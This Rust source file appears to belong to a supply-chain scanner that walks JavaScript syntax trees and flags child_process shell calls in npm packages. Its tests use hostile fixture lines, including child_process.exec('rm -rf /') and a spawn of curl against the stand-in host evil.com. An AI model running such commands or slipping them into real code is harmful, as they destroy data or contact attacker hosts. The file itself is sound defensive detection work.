use swc_core::ecma::ast::*;
use swc_core::ecma::visit::{Visit, VisitWith};
use doria_types::{Finding, FindingKind, Severity, Location};

/// Patterns that indicate shell execution
const SHELL_PATTERNS: &[&str] = &[
    "exec",
    "execSync",
    "spawn",
    "spawnSync",
    "fork",
    "execFile",
    "execFileSync",
];

/// The object that owns these methods
const SHELL_OBJECTS: &[&str] = &[
    "child_process",
    "childProcess",
];

pub struct ShellDetector {
    pub findings: Vec<Finding>,
    pub file: String,
    pub package_name: String,
    pub package_version: String,
}

impl ShellDetector {
    pub fn new(file: String, package_name: String, package_version: String) -> Self {
        Self {
            findings: Vec::new(),
            file,
            package_name,
            package_version,
        }
    }

    fn add_finding(&mut self, line: u32, column: u32, description: String, evidence: Option<String>) {
        self.findings.push(Finding {
            id: format!("doria-shell-{:03}", self.findings.len() + 1),
            kind: FindingKind::ShellExecution,
            severity: Severity::Critical,
            package_name: self.package_name.clone(),
            package_version: self.package_version.clone(),
            description,
            location: Some(Location {
                file: self.file.clone(),
                line,
                column,
            }),
            evidence,
            confidence: 0.95,
            slopsquatting: None,
        });
    }
}

impl Visit for ShellDetector {
    fn visit_call_expr(&mut self, call: &CallExpr) {
        if let Callee::Expr(expr) = &call.callee {
            match expr.as_ref() {
                // Detects: child_process.exec(...)
                Expr::Member(member) => {
                    if let Expr::Ident(obj) = member.obj.as_ref() {
                        if let MemberProp::Ident(prop) = &member.prop {
                            let obj_name = obj.sym.as_ref();
                            let method_name = prop.sym.as_ref();

                            if SHELL_OBJECTS.contains(&obj_name)
                                && SHELL_PATTERNS.contains(&method_name)
                            {
                                let line = call.span.lo.0;
                                self.add_finding(
                                    line,
                                    0,
                                    format!(
                                        "Shell execution via {}.{}() detected",
                                        obj_name, method_name
                                    ),
                                    None,
                                );
                            }
                        }
                    }
                }
                // Detects: exec(...) after require('child_process')
                Expr::Ident(ident) => {
                    let name = ident.sym.as_ref();
                    if SHELL_PATTERNS.contains(&name) {
                        let line = call.span.lo.0;
                        self.add_finding(
                            line,
                            0,
                            format!("Shell execution via {}() detected", name),
                            None,
                        );
                    }
                }
                _ => {}
            }
        }

        // Keep walking the AST
        call.visit_children_with(self);
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use swc_core::ecma::parser::{lexer::Lexer, Parser, StringInput, Syntax};
    use swc_core::common::{SourceMap, FileName};
    use std::sync::Arc;

    fn detect_in_js(code: &str) -> Vec<Finding> {
        let cm = Arc::new(SourceMap::default());
        let fm = cm.new_source_file(FileName::Anon, code.to_string());
        let lexer = Lexer::new(
            Syntax::Es(Default::default()),
            Default::default(),
            StringInput::from(&*fm),
            None,
        );
        let mut parser = Parser::new_from(lexer);
        let module = parser.parse_module().expect("failed to parse");

        let mut detector = ShellDetector::new(
            "test.js".to_string(),
            "test-pkg".to_string(),
            "1.0.0".to_string(),
        );
        detector.visit_module(&module);
        detector.findings
    }

    #[test]
    fn test_detects_child_process_exec() {
        let code = r#"
            const cp = require('child_process');
            child_process.exec('rm -rf /');
        "#;
        let findings = detect_in_js(code);
        assert!(!findings.is_empty());
        assert_eq!(findings[0].kind, FindingKind::ShellExecution);
    }

    #[test]
    fn test_detects_spawn() {
        let code = r#"
            child_process.spawn('curl', ['http://evil.com']);
        "#;
        let findings = detect_in_js(code);
        assert!(!findings.is_empty());
    }

    #[test]
    fn test_clean_code_passes() {
        let code = r#"
            const x = 1 + 1;
            console.log(x);
        "#;
        let findings = detect_in_js(code);
        assert!(findings.is_empty());
    }
}